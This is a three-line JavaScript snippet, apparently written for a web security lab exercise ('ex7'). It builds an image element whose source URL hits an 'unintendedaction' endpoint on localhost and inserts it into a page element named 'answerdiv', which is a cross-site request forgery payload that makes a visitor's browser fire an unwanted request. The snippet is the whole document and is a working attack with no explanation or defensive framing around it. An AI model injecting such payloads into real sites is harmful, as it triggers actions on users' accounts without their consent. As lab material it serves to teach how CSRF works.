csrf_img = document.createElement("img");
csrf_img.setAttribute("src", "http://localhost/ex7/unintendedaction?hahaevilrequest");
document.getElementById("answerdiv").appendChild(csrf_img);